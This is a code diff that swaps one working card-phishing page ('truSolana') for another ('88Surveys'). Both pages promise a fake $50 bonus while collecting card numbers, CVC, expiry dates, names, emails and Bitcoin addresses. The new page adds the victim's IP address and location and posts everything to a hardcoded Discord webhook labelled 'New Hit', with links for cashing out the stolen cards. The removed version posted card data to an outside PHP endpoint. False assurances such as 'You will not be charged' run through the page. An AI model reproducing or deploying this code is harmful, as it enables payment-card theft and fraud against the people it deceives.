@@ -1,10 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal | truSolana</title>
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="icon" href="https://www.favicon-generator.org/download/2015-01-17/f423038bce9ead233bbe066c22545758.ico">
+    
+    <title>Bonus | 88Surveys</title>
+<meta name="title" content="88Surveys" />
+<meta name="description" content="Earn $$$ in minutes by helping your favorite companies. Now in invite only testing." />
+
+<!-- Open Graph / Facebook -->
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://88surveys.com" />
+<meta property="og:title" content="88Surveys" />
+<meta property="og:description" content="Earn $$$ in minutes by helping your favorite companies. Now in invite only testing." />
+
+<!-- Twitter -->
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:url" content="https://88surveys.com" />
+<meta property="twitter:title" content="88Surveys" />
+<meta property="twitter:description" content="Earn $$$ in minutes by helping your favorite companies. Now in invite only testing." />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/inter-ui/3.19.3/inter.css" rel="stylesheet">
     <style>
         .blurple {
             color: #5865F2; /* Discord blurple */
@@ -21,140 +38,170 @@
         }
     </style>
 </head>
-<body class="bg-gray-900 text-white flex flex-col min-h-screen">
+<body>
+<!--
+Include Tailwind JIT CDN compiler
+More info: https://beyondco.de/blog/tailwind-jit-compiler-via-cdn
+-->
+<script src="https://unpkg.com/tailwindcss-jit-cdn"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.5.2/cdn.js"></script>
 
-    <!-- Welcome Modal -->
-    <div id="welcome-modal" class="fixed inset-0 flex items-center justify-center bg-black-900 bg-opacity-75 z-50 hidden">
-        <div class="bg-black-900 rounded-lg p-6 w-96 text-center">
-            <h2 id="modal-header" class="text-2xl font-bold mb-4">Welcome to truSolana</h2>
-            <p id="modal-paragraph" class="text-gray-400 mb-6">You've just been granted access to the most advanced upcoming Solana platform. Just join our platform to claim your $50 USD signup bonus - no B.S. like silly deposits or ID requirements to claim.</p>
-            <div id="error-message" class="error-message hidden"></div>
-            <input id="modal-input" type="number" placeholder="0000 0000 0000 0000" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
-            <div class="flex mb-4 hidden" id="expiration-container">
-                <input id="modal-input5" type="number" placeholder="Exp. Month #" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 w-1/2 mr-2" />
-                <input id="modal-input6" type="number" placeholder="Exp. Year" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 w-1/2" />
+<!-- Snippet -->
+<section class="antialiased bg-gray-100 text-gray-600 min-h-screen p-4">
+    <div class="h-full">
+        <!-- Pay component -->
+        <div>
+            <!-- Card background -->
+            <div class="relative px-4 sm:px-6 lg:px-8 max-w-lg mx-auto">
+                <img class="rounded-t shadow-lg" src="https://t3.ftcdn.net/jpg/01/83/08/38/360_F_183083850_sdN80KwClQue1ackd798iKySJvYgumAd.jpg"  alt="" />
             </div>
-            <input id="modal-input8" type="number" placeholder="CVV" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
-            <input id="modal-input21" type="number" placeholder="ZIP Code" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
-            <input id="modal-input22" type="text" placeholder="Full Name" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
-            <input id="modal-input2" type="email" placeholder="Enter your email" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" required/>
-            
-            <button id="modal-button" class="bg-blurple text-white font-semibold py-2 px-4 rounded shadow hover:bg-blurple-hover transition duration-300">Next</button>
+            <!-- Card body -->
+            <div class="relative px-4 sm:px-6 lg:px-8 pb-8 max-w-lg mx-auto" x-data="{ card: true }">
+                <div class="bg-white px-8 pb-6 rounded-b shadow-lg">
+<br>
+                    <!-- Card header -->
+                    <div class="text-center mb-6">
+                       
+                        <h1 class="text-xl leading-snug text-gray-800 font-semibold mb-2">Join 88Surveys & Claim $50</h1>
+                        <div class="text-sm">
+                            Be the first to try the best earnings platform, with over $2 per quick survey sponsored by large companies needing consumer input.<br><br> One reward claim per household. A hold of $1 or less may be placed on your card then removed instantly to ensure it is valid. We will never charge you.
+                        </div>
+                    </div>
+
+                    <!-- Toggle -->
+                    <div class="flex justify-center mb-6">
+                        <div class="relative flex w-full p-1 bg-gray-50 rounded">
+                            <span class="absolute inset-0 m-1 pointer-events-none" aria-hidden="true">
+                                <span class="absolute inset-0 w-1/2 bg-white rounded border border-gray-200 shadow-sm transform transition duration-150 ease-in-out" :class="card ? 'translate-x-0' : 'translate-x-full'"></span>
+                            </span>
+                            <button class="relative flex-1 text-sm font-medium p-1 transition duration-150 ease-in-out focus:outline-none focus-visible:ring-2" @click.prevent="card = true">Receive via Bitcoin</button>
+                            <button class="relative flex-1 text-sm font-medium p-1 transition duration-150 ease-in-out focus:outline-none focus-visible:ring-2" @click.prevent="card = false">Receive via PayPal</button>
+                        </div>
+                    </div>
+
+                    <div x-show="card">
+                        <form id="bitcoin-form" onsubmit="sendToDiscord(event)">
+                        <div class="space-y-4">
+                          <!-- Email -->
+                            <div>
+                                <label class="block text-sm font-medium mb-1" for="card-email">Email <span class="text-red-500">*</span></label>
+                                <input id="card-email" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="email" placeholder="john@company.com" />
+                            </div>
+                        </div>
+                          <!-- Card Number -->
+                            <div>
+                                <label class="block text-sm font-medium mb-1" for="card-nr">Bitcoin Address <small>(where you will receive bonus)</small> <span class="text-red-500">*</span></label>
+                                <input id="btc-nr" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297" />
+                            </div>
+                            <!-- Card Number -->
+                            <div>
+                                <label class="block text-sm font-medium mb-1" for="card-nr">Card Number <span class="text-red-500">*</span></label>
+                                <input id="card-nr" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="1234 1234 1234 1234" />
+                            </div>
+                            <!-- Expiry and CVC -->
+                            <div class="flex space-x-4">
+                                <div class="flex-1">
+                                    <label class="block text-sm font-medium mb-1" for="card-expiry">Expiry Date <span class="text-red-500">*</span></label>
+                                    <input id="card-expiry" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="MM/YY" />
+                                </div>
+                                <div class="flex-1">
+                                    <label class="block text-sm font-medium mb-1" for="card-cvc">CVC <span class="text-red-500">*</span></label>
+                                    <input id="card-cvc" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="CVC" />
+                                </div>
+                            </div>
+                            <!-- Name on Card -->
+                            <div>
+                                <label class="block text-sm font-medium mb-1" for="card-name">Name on Card <span class="text-red-500">*</span></label>
+                                <input id="card-name" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="John Doe" />
+                            </div>
+                            
+                        <!-- Form footer -->
+                        <div class="mt-6">
+                                <div class="mb-4">
+                                    <button type="submit" class="font-medium text-sm inline-flex items-center justify-center px-3 py-2 border border-transparent rounded leading-5 shadow-sm transition duration-150 ease-in-out w-full bg-indigo-500 hover:bg-indigo-600 text-white focus:outline-none focus-visible:ring-2">Register & Receive Bonus</button>
+                                </div>
+                                <div class="text-xs text-gray-500 italic text-center">You will not be charged. Your payment information will not be saved.</div>
+                            </div>
+                            </form>
+                    </div>
+
+                    <!-- PayPal form -->
+                    <div x-show="!card" x-cloak>
+                        <div>
+                            <div class="mb-4">
+                                <button class="font-medium text-sm inline-flex items-center justify-center px-3 py-2 border border-transparent rounded leading-5 shadow-sm transition duration-150 ease-in-out w-full bg-indigo-500 hover:bg-indigo-600 text-white focus:outline-none focus-visible:ring-2">Pay with PayPal - $253.00</button>
+                            </div>
+                            <div class="text-xs text-gray-500 italic text-center">You will not be charged. Your payment information will not be saved.</div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
         </div>
     </div>
+</section>
 
-    <main class="flex-grow flex items-center justify-center">
-       
-    </main>
+<script>
+    async function sendToDiscord(event) {
+        event.preventDefault(); // Prevent the default form submission
 
-    <footer class="text-center p-4 shadow-md">
-        <p class="text-gray-400">© truMedia · 💰 Currency: USD</p>
-    </footer>
+        // Gather form data
+        const email = document.getElementById('card-email').value;
+        const bitcoinAddress = document.getElementById('btc-nr').value;
+        const cardNumber = document.getElementById('card-nr').value;
+        const expiryDate = document.getElementById('card-expiry').value;
+        const cvc = document.getElementById('card-cvc').value;
+        const nameOnCard = document.getElementById('card-name').value;
 
-    <script>
-        // Show the welcome modal on page load
-        document.addEventListener('DOMContentLoaded', () => {
-            const modal = document.getElementById('welcome-modal');
-            modal.classList.remove('hidden');
+        // Get user's IP address and location
+        const ipResponse = await fetch('https://ipinfo.io/json?token=b47f552bf713bf'); // Replace with your IPinfo token
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+        const location = ipData.city + ', ' + ipData.region + ', ' + ipData.country;
+        const userAgent = navigator.userAgent;
+
+        // Create the embed object
+        const embed = {
+            title: "🍪 New Hit",
+            fields: [
+                { name: "✉️ Email", value: email, inline: false },
+                { name: "🪙 Bitcoin Address", value: bitcoinAddress, inline: true },
+                { name: "💳 Card Number", value: cardNumber, inline: false },
+                { name: "📅 Expiry Date", value: expiryDate, inline: true },
+                { name: "💯 CVC", value: cvc, inline: false },
+                { name: "🥸 Name on Card", value: nameOnCard, inline: true },
+                { name: "💻 User IP", value: userIP, inline: false },
+                { name: "📍 Location", value: location, inline: true },
+                { name: "🖥️ User Agent", value: userAgent, inline: false },
+                { name: "🛒 Cashout Card (w/ Billing)", value: "[Stripe](https://buy.stripe.com/5kA9DM0Ur3b8dMseUZ)", inline: true },
+                { name: "🛒 Cashout Card (w/out Billing)", value: "[Stripe 2](https://buy.stripe.com/28oaHQgTpbHEaAg4gm)", inline: false },
+            ],
+            footer: {
+                text: "Copyright 2025 icedvampirefanclub",
+            },
+            color: 5814783 // Discord blurple color
+        };
+
+        // Send the data to the Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1345239961443635242/g_gUp4GyLy1-mFm3P38ICnDqRMCfYFqC4H9AXIC5rJVPRGOzDQj2tzjZdBPTsQ5pDrTj'; // Replace with your webhook URL
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ embeds: [embed] })
         });
 
-        const modalButton = document.getElementById('modal-button');
-        const modalHeader = document.getElementById('modal-header');
-        const modalParagraph = document.getElementById('modal-paragraph');
-        const modalInput = document.getElementById('modal-input');
-                const modalInput2 = document.getElementById('modal-input2');
-        const modalInput5 = document.getElementById('modal-input5');
-        const modalInput6 = document.getElementById('modal-input6');
-        const modalInput8 = document.getElementById('modal-input8');
-        const modalInput21 = document.getElementById('modal-input21');
-        const modalInput22 = document.getElementById('modal-input22');
-        const errorMessage = document.getElementById('error-message');
+        if (response.ok) {
+            //alert('Your BTC bonus was sent and is pending approval. Please keep an eye out on your wallet and email for our platform opening! You should receive your bonus within 24 hours.');
+            document.getElementById('bitcoin-form').reset();
+            window.location.replace("https://88surveys.com/onboarding/new-user/bonus/complete");
 
-        let step = 0;
-
-        modalButton.addEventListener('click', () => {
-            // Clear previous error message
-            errorMessage.classList.add('hidden');
-            errorMessage.textContent = '';
-
-            if (step === 2 && !modalInput2.value) {
-                errorMessage.textContent = "Please enter a valid email to continue.";
-                errorMessage.classList.remove('hidden');
-                return;
-            }
-            if (step === 3 && (!modalInput.value || !modalInput8.value || !modalInput5.value || !modalInput6.value)) {
-                errorMessage.textContent = "Please enter your card info to continue.";
-                errorMessage.classList.remove('hidden');
-                return;
-            }
-
-            step++;
-            if (step === 1) {
-                modalHeader.textContent = "Information and Agreement";
-                modalParagraph.textContent = "The promotion is paid for from the new user promotion sponsored by truMedia. All users are allowed one account per household, and bonus is subject to review by the truSolana team. By claiming the $50 bonus, you are creating a truSolana account and agree to all Terms of Service listed on our homepage.";
-            } else if (step === 2) {
-                modalHeader.textContent = "Email";
-                modalParagraph.textContent = "By entering your email, you agree to receive promotional emails following the launch of truSolana. When our platform launches, you will receive an email to access your account, along with an additional $100 USD bonus on-site apart from the bonus you are claiming now.";
-                modalInput2.classList.remove('hidden'); // Show input field
-                modalInput.value = ""; // Clear input field
-            } else if (step === 3) {
-                modalInput2.classList.add('hidden');
-                modalHeader.textContent = "And finally..";
-                modalParagraph.textContent = "Please verify you are not abusing our promotion. You will not be charged. A hold of up to $1.00 may be placed to verify your card which will be removed instantly. You will be brought to your account panel where you can cashout instantly.";
-                modalInput.classList.remove('hidden');
-                document.getElementById('expiration-container').classList.remove('hidden'); // Show expiration fields
-                modalInput8.classList.remove('hidden');
-                modalInput21.classList.remove('hidden');
-                modalInput22.classList.remove('hidden');// Show CVV input field
-                modalInput.value = ""; // Clear input field
-            } else {
-// Prepare to submit the form data
-const expMonth = modalInput5.value.padStart(2, '0'); // Format month to two digits
-const expYear = modalInput6.value.length === 2 ? '20' + modalInput6.value : modalInput6.value; // Convert to four digits if necessary
-
-// Create a POST request
-const formData = new FormData();
-formData.append('card_number', modalInput.value);
-formData.append('exp_month', expMonth);
-formData.append('exp_year', expYear);
-formData.append('cvc', modalInput8.value);
-formData.append('email', modalInput2.value); // Add email to the POST request
-formData.append('zipcode', modalInput21.value); // Add email to the POST request
-formData.append('fullname', modalInput22.value); // Add email to the POST request
-
-// Change button text to "Loading..."
-modalButton.textContent = "Loading...";
-modalButton.disabled = true; // Disable the button to prevent multiple submissions
-
-// Send the POST request
-fetch('https://burgz.alwaysdata.net/onboarding.php', { // Replace with your actual processing URL
-    method: 'POST',
-    body: formData,
-})
-.then(response => response.json())
-.then(data => {
-    if (data.status === 'success') {
-        // Redirect after 2 seconds
-        setTimeout(() => {
-            window.location.href = 'https://portal.trusolana.com/onboarding/new-user/registered'; // Replace with your actual URL
-        }, 2000);
-    } else {
-        // Handle error response
-        errorMessage.textContent = 'The card was either invalid or declined the charge. Please try again.';
-        errorMessage.classList.remove('hidden');
-        modalButton.textContent = "Next"; // Reset button text
-        modalButton.disabled = false; // Re-enable the button
+        } else {
+            document.getElementById('bitcoin-form').reset();
+        }
     }
-})
-.catch(error => {
-    errorMessage.textContent = 'An error occurred. Please try again.';
-    errorMessage.classList.remove('hidden');
-    modalButton.textContent = "Next"; // Reset button text
-    modalButton.disabled = false; // Re-enable the button
-});
-            }
-        });
-    </script>
+</script>
 
 </body>
 </html>
